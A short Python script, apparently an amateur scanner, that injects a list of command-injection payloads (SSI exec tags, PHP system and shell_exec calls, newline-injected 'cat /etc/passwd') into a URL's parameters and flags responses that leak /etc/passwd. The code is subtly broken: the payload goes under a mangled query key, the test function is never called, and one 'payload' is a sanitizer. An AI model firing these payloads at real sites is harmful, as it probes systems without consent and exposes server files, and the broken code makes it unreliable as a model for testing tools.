# A vewry simple script that takes a URL as an argument and tests for code injection vulnerabilities by attempting to read the /etc/passwd file
# First, it requests the URL without tampering and stores the response, followed by requesting the same URL with the injected payloads.
# if responses differ, then it greps for common "/etc/passwd" strings in the output
# the program will print the URL and the payload that was used to test for the vulnerability

# This vulnerability is found predominantly on PHP-based websites lacking proper sanitization on parameter values
# There are tons of potential improvements here, including searching for SSRF, adding python/node/ruby frameworks, adding Window's based payloads


import requests
import sys
import argparse
from urllib.parse import urlparse
from urllib.parse import parse_qs
from urllib.parse import urlencode


# List of payloads that attempt to read the /etc/passwd file

payloads = [
    "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;",
    ";system('cat%20/etc/passwd')",
    "%0Acat%20/etc/passwd",
    "$(`cat /etc/passwd`)",
    "cat /etc/passwd",
    "%0Acat%20/etc/passwd",
    "{{ get_user_file('/etc/passwd') }}",
    "<!--#exec cmd='/bin/cat /etc/passwd'-->",
    "system('cat /etc/passwd');",
    "<?php system('cat /etc/passwd');?>",
    "shell_exec('cat /etc/passwd');",
    "escapeshellcmd('cat /etc/passwd');",
    "%0Acat%20/etc/passwd%0A"]


vuln_strings = [ "root:x:0:0:root:/root:/bin/bash",
                "bin:x:1:1:bin:/bin:",
                ":mail:/var/mail:"]

# Check if the user has provided a URL, if not, print usage and exit
if len(sys.argv) == 1:
    print("Usage: python3 code-injection-etc-passwd.py <URL>")
    sys.exit(1)
    
def check_url(url):
    parsed_url = urlparse(url)
    if not parsed_url.query:
        print("Error: URL requires parameter to test for code injection. \n For example, http://www.babyworld.edu/hyperbaby.php?patient=0")
        sys.exit(1)
    else:
        return url

url = check_url(sys.argv[1])




# Requests the URL given by the user and store the response

def get_response(url):
    try:
        response = requests.get(url)
        return response
    except:
        print("Error: Unable to connect to URL")
        sys.exit(1)

# Request the URL again but replace parameter value with each payload in the payloads list
# if the response contains any of the strings in the "vuln_strings" list then
# print the URL and the payload that was used to test for the vulnerability

def test_payloads(url):
    parsed_url = urlparse(url)
    query = parse_qs(parsed_url.query)
    for payload in payloads:
        query[parsed_url.query] = payload
        new_query = urlencode(query, doseq=True)
        new_url = parsed_url._replace(query=new_query)
        response = requests.get(new_url.geturl())
        if any(vuln_string in response.text for vuln_string in vuln_strings):
            print("Vulnerability found at: " + new_url.geturl() + "\nPayload used: " + payload + "\n")
        else:
            continue
        
